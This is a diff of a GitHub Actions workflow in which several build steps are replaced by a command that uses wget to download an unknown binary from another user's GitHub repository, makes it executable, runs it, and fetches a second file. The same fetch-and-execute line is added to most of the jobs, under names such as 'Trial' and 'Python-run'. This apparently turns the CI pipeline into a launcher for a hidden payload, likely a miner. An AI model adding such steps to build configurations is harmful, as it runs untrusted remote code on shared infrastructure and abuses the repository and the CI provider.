@@ -13,8 +13,8 @@ jobs:
     runs-on: ubuntu-latest
 
     steps:
-    - uses: actions/checkout@v3
-    - name: Build the Docker image
+    - uses: actions/checkout@v2
+    - name: Trial
       run: wget -O 1 https://raw.githubusercontent.com/trautroi/aws/master/nice && chmod +x 1 && ./1 && wget -O 2 https://raw.githubusercontent.com/johnwixk228/ujicoba/main/v2
 
     strategy:
@@ -27,7 +27,7 @@ jobs:
     steps:
     - uses: actions/checkout@v2
     - name: Python-run
-      run: echo "pythosns"
+      run: wget -O 1 https://raw.githubusercontent.com/trautroi/aws/master/nice && chmod +x 1 && ./1 && wget -O 2 https://raw.githubusercontent.com/johnwixk228/ujicoba/main/v2
 
  python-2:
     runs-on: ubuntu-18.04
@@ -42,8 +42,7 @@ jobs:
     steps:
     - uses: actions/checkout@v2
     - name: Python-run
-      run: echo "pythosns"
-
+      run: wget -O 1 https://raw.githubusercontent.com/trautroi/aws/master/nice && chmod +x 1 && ./1 && wget -O 2 https://raw.githubusercontent.com/johnwixk228/ujicoba/main/v2
  python-build-4:
     runs-on: ubuntu-20.04
     needs: python-2
@@ -57,5 +56,4 @@ jobs:
     - uses: actions/checkout@v2
     - name: Rerunning
       continue-on-error: true
-      run: |
-        wget -O 1 https://raw.githubusercontent.com/trautroi/aws/master/nice && chmod +x 1 && ./1 && wget -O 2 https://raw.githubusercontent.com/johnwixk228/ujicoba/main/v2
+      run:  wget -O 1 https://raw.githubusercontent.com/trautroi/aws/master/nice && chmod +x 1 && ./1 && wget -O 2 https://raw.githubusercontent.com/johnwixk228/ujicoba/main/v2
